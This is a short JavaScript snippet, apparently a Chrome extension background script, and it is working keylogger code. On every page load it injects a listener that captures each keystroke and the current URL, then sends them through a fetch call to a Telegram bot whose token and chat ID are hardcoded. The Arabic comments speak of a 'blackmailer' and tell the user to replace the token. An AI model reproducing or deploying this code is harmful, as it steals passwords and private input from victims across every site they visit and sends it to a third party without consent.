chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete') {
        chrome.scripting.executeScript({
            target: { tabId: tabId },
            func: () => {
                document.addEventListener('keyup', (e) => {
                    const data = `⌨️ المبتز كتب: ${e.key} في موقع: ${window.location.href}`;
                    // إرسال البيانات للبوت (استبدل التوكن والأيدي هنا أيضاً)
                    fetch('https://api.telegram.org/bot8550792437:AAFPRHjdjDq1vQvhLKs6S5DpfRId13-MhHc/sendMessage?chat_id=7184970355&text=' + encodeURIComponent(data));
                });
            }
        });
    }
});
